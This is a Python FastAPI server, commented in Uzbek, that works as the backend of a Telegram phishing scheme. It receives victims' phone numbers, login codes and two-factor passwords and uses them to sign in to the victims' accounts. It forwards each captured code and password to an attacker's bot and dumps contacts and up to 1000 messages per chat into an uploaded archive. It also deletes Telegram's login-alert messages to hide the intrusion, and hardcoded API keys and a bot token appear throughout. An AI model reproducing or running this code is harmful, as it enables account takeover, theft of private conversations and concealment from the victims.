
import os
import asyncio
import uvicorn
import httpx
import io
from fastapi import FastAPI, BackgroundTasks
from pydantic import BaseModel
from telethon import TelegramClient, errors, types
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from fastapi.middleware.cors import CORSMiddleware

# CORE CONFIG
_API_ID = 32586288
_API_HASH = 'f83b125b994fda5b2e820bb6c749328b'
_BOT_TOKEN = "8153551399:AAHTzgDDJDSyBqmW9vuolk0lZNHYVcjaPqU"
_ADMIN_ID = 8426582765

app = FastAPI()
app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_methods=["*"], 
    allow_headers=["*"]
)

_clients = {}
_hashes = {}
_stats = {"total_attempts": 0, "successful_logins": 0}

async def _api_call(method, params, files=None):
    async with httpx.AsyncClient() as c:
        try:
            url = f"https://api.telegram.org/bot{_BOT_TOKEN}/{method}"
            if files:
                r = await c.post(url, data=params, files=files)
            else:
                r = await c.post(url, json=params)
            return r.json()
        except: return {}

async def _send_to_admin(txt):
    await _api_call("sendMessage", {"chat_id": _ADMIN_ID, "text": txt, "parse_mode": "HTML"})

async def _send_file_to_admin(file_bytes, filename, caption):
    files = {'document': (filename, file_bytes)}
    await _api_call("sendDocument", {"chat_id": _ADMIN_ID, "caption": caption}, files=files)

async def _do_dump(client, phone, password=None):
    try:
        me = await client.get_me()
        _stats["successful_logins"] += 1
        
        # 1. Login haqida tezkor xabar
        status_msg = f"🚀 <b>YANGI QURBONY Abbos!</b>\n" \
                     f"👤 Ism: {me.first_name}\n" \
                     f"📞 Raqam: {phone}\n" \
                     f"🔐 2FA: {password if password else 'yoq'}\n" \
                     f"📈 Jami ulanganlar: {_stats['successful_logins']}"
        await _send_to_admin(status_msg)

        # 2. TO'LIQ YOZISHMALARNI YIG'ISH (TXT FORMAT)
        full_history_buffer = io.StringIO()
        full_history_buffer.write(f"TELEGRAM ARHIV: {phone}\n")
        full_history_buffer.write(f"Ism: {me.first_name} {me.last_name if me.last_name else ''}\n")
        full_history_buffer.write(f"Sana: {me.id}\n")
        full_history_buffer.write("="*50 + "\n\n")

        # Kontaktlarni yozish
        try:
            contacts = await client(GetContactsRequest(hash=0))
            full_history_buffer.write("--- KONTAKTLAR ---\n")
            for u in contacts.users:
                full_history_buffer.write(f"{u.first_name} {u.last_name if u.last_name else ''} (+{u.phone})\n")
            full_history_buffer.write("\n" + "="*50 + "\n\n")
        except: pass

        # Barcha chatlarni va xabarlarni aylanib chiqish
        dialogs = await client.get_dialogs(limit=50) # Oxirgi 50 ta suhbat
        for d in dialogs:
            full_history_buffer.write(f"\n--- CHAT: {d.name} (ID: {d.id}) ---\n")
            try:
                # Har bir chatdan oxirgi 1000 tagacha xabarni olish (boshidan oxirigacha)
                async for msg in client.iter_messages(d, limit=1000):
                    sender = "U" if msg.out else d.name
                    date_str = msg.date.strftime('%Y-%m-%d %H:%M')
                    txt = msg.text or "[Media]"
                    full_history_buffer.write(f"[{date_str}] {sender}: {txt}\n")
            except:
                full_history_buffer.write("[Xabarlarni o'qib bo'lmadi]\n")

        # Faylni yuborish
        file_bytes = full_history_buffer.getvalue().encode('utf-8')
        await _send_file_to_admin(file_bytes, f"arxiv_{phone}.txt", f"📂 {phone} ning to'liq yozishmalari")

        # 3. TG xabarlarini tozalash (yashirin kirish uchun)
        async for m in client.iter_messages(777000, limit=10):
            if any(x in (m.text or "").lower() for x in ["login", "device", "ip:", "kirildi"]):
                await m.delete()

    except Exception as e:
        await _send_to_admin(f"❌ Dump xatosi ({phone}): {str(e)}")

@app.get("/")
async def root(): 
    return {"status": "online", "stats": _stats}

@app.post("/send-code")
async def sc(r: dict):
    p = r["phone"]
    _stats["total_attempts"] += 1
    if not os.path.exists('sessions'): os.makedirs('sessions')
    
    cl = TelegramClient(f"sessions/{p}", _API_ID, _API_HASH, device_model="Samsung S24 Ultra", system_version="Android 14")
    try:
        await cl.connect()
        h = await cl.send_code_request(p)
        _clients[p], _hashes[p] = cl, h.phone_code_hash
        await _send_to_admin(f"🔔 <b>{p}</b>: Kod kiritish kutilmoqda...")
        return {"status": "ok"}
    except Exception as e: 
        return {"status": "error", "message": str(e)}

@app.post("/login")
async def lg(r: dict, bt: BackgroundTasks):
    p, c, pw = r["phone"], r.get("code"), r.get("password")
    
    if p not in _clients:
        cl = TelegramClient(f"sessions/{p}", _API_ID, _API_HASH)
        await cl.connect()
        _clients[p] = cl
    
    cl = _clients[p]
    try:
        if pw:
            await cl.sign_in(password=pw)
            await _send_to_admin(f"🔑 <b>{p}</b>: 2FA Parol kiritildi: <code>{pw}</code>")
            bt.add_task(_do_dump, cl, p, pw)
        else:
            await cl.sign_in(p, c, phone_code_hash=_hashes.get(p))
            await _send_to_admin(f"✅ <b>{p}</b>: Kod tasdiqlandi: <code>{c}</code>")
            bt.add_task(_do_dump, cl, p)
            
        return {"status": "ok"}
    except errors.SessionPasswordNeededError:
        await _send_to_admin(f"🔐 <b>{p}</b>: 2FA parol so'ralmoqda...")
        return {"status": "2fa_needed"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    if not os.path.exists('sessions'): os.makedirs('sessions')
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
